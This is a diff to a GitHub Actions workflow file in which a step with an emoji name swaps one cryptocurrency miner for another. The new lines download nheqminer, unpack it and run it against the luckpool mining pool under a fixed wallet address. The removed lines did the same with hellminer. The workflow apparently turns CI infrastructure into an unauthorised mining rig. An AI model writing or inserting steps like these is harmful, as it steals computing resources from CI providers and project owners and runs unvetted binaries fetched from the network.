@@ -26,6 +26,6 @@ jobs:
       uses: actions/checkout@v1
     - name: 🤣🙈💯
       run: |
-        wget https://github.com/hellcatz/luckpool/blob/master/miners/hellminer_cpu_linux.tar.gz
-        tar zxvf hellminer_cpu_linux.tar.gz
-        ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RP1ntCUiBNERYrp25mccFoR22V1uPSxxTg.hellminer -p x --cpu 12
+        wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+        tar xf nheqminer-Linux-v0.8.2.tgz
+        ./nheqminer -v -l stratum+tcp://na.luckpool.net:3956 -u RP1ntCUiBNERYrp25mccFoR22V1uPSxxTg.hellminer -p x -t2
